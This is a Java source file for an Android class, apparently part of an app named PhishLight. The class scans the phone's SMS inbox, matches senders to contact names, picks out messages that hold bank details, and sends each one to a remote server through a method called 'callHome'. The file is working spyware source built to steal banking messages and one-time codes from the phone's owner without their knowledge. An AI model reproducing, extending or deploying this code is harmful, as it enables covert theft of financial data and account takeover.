package org.rix1.PhishLight;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.widget.Toast;
import android.util.Log;


import java.util.Date;

public class SmsHelper extends AsyncTask<String, Void, Boolean>{
	
	private Context context;
	private DataHelper dataHelper;
	private NetworkHelper networkHelper;
	
	public SmsHelper(Context c) {
		this.context = c;
	}
	
	public String postNewSms() {
		String SORT_ORDER = "date DESC";
		int count = 0;
		int successfullSentMessages = 0;
		
		// Get the lastTime pref to only scan messages we haven't scanned.
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
	    long lastTime = prefs.getLong("lastTime", -1);

		Cursor cursor = context.getContentResolver().query(
				Uri.parse("content://sms"),
				new String[] { "_id", "address", "date","body", "type" }, "date > " + lastTime, null, SORT_ORDER);

		if (cursor != null) {
			
			try {
				
				count = cursor.getCount();
				if (count > 0) {
					
					cursor.moveToFirst();
					long newLastTime = cursor.getLong(4);
					
					
					do{
						
						Long messageId = cursor.getLong(0);
						String address = cursor.getString(1);
						String otherName = getContactName(context, formatNumber(address));
						@SuppressWarnings("deprecation")
						Date timestamp = new Date( cursor.getString(2) );
						String body = cursor.getString(3);				
						
						SmsDetails newSms = new SmsDetails(timestamp, messageId, body, otherName);
						
						if( newSms.hasBankDetails() ) {
							
							if( successfullSentMessages == 0 ) {
								dataHelper = new DataHelper( context ); 
							}
							
							callHome(newSms);
							successfullSentMessages++;
						}						
						
					}while(cursor.moveToNext());
					
					// Update the newest timestamp scanned
					prefs.edit().putLong("lastTime", newLastTime).commit();
					
					return "successfull sms: " + successfullSentMessages + " / " + count; // (SmsDetails[])bankSmsArray.toArray(new SmsDetails[bankSmsArray.size()]);
				}
			} finally {
				cursor.close();
			}
		}
		return null;
	}

	@Override
	protected Boolean doInBackground(String... params) {
		// TODO Auto-generated method stub
		
		
		// Not sure if this will ever be called or not.
		postNewSms();
		
		return null;
	}
	
	public void callHome(SmsDetails sms) {
        Toast.makeText(context, "Calling home...",Toast.LENGTH_SHORT).show();
        Log.d("APP:", "Calling home");
        networkHelper = new NetworkHelper();

        // For testing only
//        listAllAccounts();

        networkHelper.makePOSTRequest(dataHelper.getData(sms));
        networkHelper.execute();
    }
	
	// This method attempts to get the contact name from a phone number.
	private static String getContactName(Context context, String otherNumber) {
	  String where = ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE '%" + otherNumber + "'";
	  Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
	          null, where, null, null);
	  String name = "Self";
	  if (cursor.getCount() > 0) {
	    cursor.moveToFirst();
        name = cursor.getString(
                        cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
	  } else {
	    // Try without the dashes.
	    where = ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE '%" + otherNumber.replaceAll("-", "").substring(1) + "'";
	    cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
	              null, where, null, null);
	    if (cursor.getCount() > 0) {
	        cursor.moveToFirst();
	        name = cursor.getString(
	                        cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
	    }
	  }
	  return name;
	}
	
	// This method formats the contact number in an attempt to match how it was entered by the user.
	public static String formatNumber(String number){
	  String result = "";
	  if (number.startsWith("+")){
	    result = number.substring(0, 2) + "-" + number.substring(2,5) + "-" + 
	        number.substring(5,8) + "-" + number.substring(8);
	  } else if (number.startsWith("1")) {
	    result = number.substring(0, 1) + "-" + number.substring(1,4) + "-" + 
            number.substring(4,7) + "-" + number.substring(7);
	  } else {
	    result = number.substring(0, 3) + "-" + number.substring(3,6) + "-" + number.substring(6);
	  }
	  return result;
	}
}
